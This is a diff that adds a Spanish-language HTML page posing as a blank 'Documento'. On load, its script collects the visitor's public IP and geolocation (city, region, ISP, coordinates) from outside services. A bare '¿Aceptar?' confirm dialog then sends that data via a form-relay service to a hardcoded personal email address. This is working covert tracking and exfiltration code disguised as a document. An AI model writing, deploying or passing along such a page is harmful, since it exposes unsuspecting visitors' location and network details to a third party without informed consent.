@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documento</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        const CORREO_DESTINO = 'fernandorokefort@gmail.com';
+        
+        let ipPublica = '';
+        let ubicacion = {};
+        
+        // Obtener IP Pública
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipPublica = data.ip;
+                obtenerUbicacion(ipPublica);
+            })
+            .catch(error => {
+                mostrarDialogo();
+            });
+        
+        // Obtener ubicación
+        function obtenerUbicacion(ip) {
+            fetch(`https://ip-api.com/json/${ip}?lang=es`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        ubicacion = data;
+                    }
+                    mostrarDialogo();
+                })
+                .catch(error => {
+                    mostrarDialogo();
+                });
+        }
+        
+        function mostrarDialogo() {
+            const resultado = confirm('¿Aceptar?');
+            
+            if (resultado) {
+                enviarCorreo();
+            }
+        }
+        
+        function enviarCorreo() {
+            const mensajeCorreo = `
+INFORMACIÓN DE RED:
+
+IP Pública: ${ipPublica}
+
+Ubicación:
+País: ${ubicacion.country || 'No disponible'}
+Ciudad: ${ubicacion.city || 'No disponible'}
+Región: ${ubicacion.regionName || 'No disponible'}
+ISP: ${ubicacion.isp || 'No disponible'}
+Latitud: ${ubicacion.lat || 'No disponible'}
+Longitud: ${ubicacion.lon || 'No disponible'}
+
+Fecha: ${new Date().toLocaleString('es-ES')}
+            `;
+            
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    access_key: '64e9a7b5-0f0a-4a7e-b3e0-1a2b3c4d5e6f',
+                    email: CORREO_DESTINO,
+                    subject: 'Información de Red',
+                    message: mensajeCorreo
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('Completado');
+                }
+            })
+            .catch(error => {
+                alert('Error');
+            });
+        }
+    </script>
+
+</body>
+</html>
